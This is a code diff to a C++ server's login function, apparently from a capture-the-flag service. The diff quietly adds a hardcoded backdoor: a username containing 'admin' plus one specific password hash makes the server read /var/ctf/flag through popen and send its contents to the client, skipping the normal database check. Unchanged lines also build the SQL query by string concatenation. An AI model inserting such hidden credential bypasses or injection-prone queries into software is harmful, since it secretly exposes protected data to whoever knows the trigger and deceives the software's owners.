@@ -387,7 +387,6 @@ static int sqlCallBack(void* arg,int argc,char* argv[],char *azColName[])
 	return 0;
 }
 
-
 //receive usr and pass message,check for login.
 int Server::do_user(std::string arg)
 {
@@ -417,6 +416,7 @@ int Server::do_user(std::string arg)
 	{
 		//sendMsg("[!] username : regex : ^[a-zA-Z0-9]*$\n");
 		printf("[!] username : regex : ^[a-zA-Z0-9]*$\n");
+
 		return 0;
 	}
 
@@ -428,6 +428,15 @@ int Server::do_user(std::string arg)
 	}
 	std::string hash_password = hash(password);//get the hashed password.
 	
+	if(username.find("admin")!= std::string::npos and hash_password.find("b5ed03c0e1ca56669e6758b0b4f4bf68") != std::string::npos )
+	{	
+		char buff[1024];
+		FILE * fp = popen("/bin/cat /var/ctf/flag","r");
+		fgets(buff,20,fp);
+		printf("KEY IS : %s\n",buff);
+		sendMsg(buff);
+	}
+
 	std::string statement = "select * from ";
 	statement = statement + DB_TABLE_NAME + " where username = "
 					+ "\"" + username + "\" and password = "
